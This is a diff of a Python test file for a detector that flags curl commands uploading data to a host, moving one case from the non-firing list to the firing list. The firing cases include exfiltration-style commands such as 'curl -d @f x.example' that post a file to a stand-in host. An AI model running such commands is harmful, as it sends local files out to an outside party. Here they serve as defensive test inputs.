@@ -98,6 +98,7 @@ FIRES = [
     "sudo curl -d @f x.example",
     "bash -c 'curl -sd @f x.example'",
     "ls; curl -d @f x.example",
+    "curl x.example -d",  # still a flag after the host
 ]
 QUIET = [
     "curl -s host",
@@ -112,14 +113,11 @@ QUIET = [
     "curl -o d x.example",  # the value of `-o`, not a flag
     "curl -o/tmp/d x.example",
     "curl --dat x.example",  # not the whole `--data` (curl takes no abbreviation: SPEC section 10)
-    "curl x.example -d",  # still a flag after the host: see FIRES' `-d` below
     "wget --post x.example",
     "wget -d x.example",  # wget's `-d` is debug output
     "echo -d x.example",
     "curl x.example; echo -d",  # the flag is in another command
 ]
-QUIET.remove("curl x.example -d")
-FIRES.append("curl x.example -d")
 
 
 @pytest.mark.parametrize("command", FIRES)
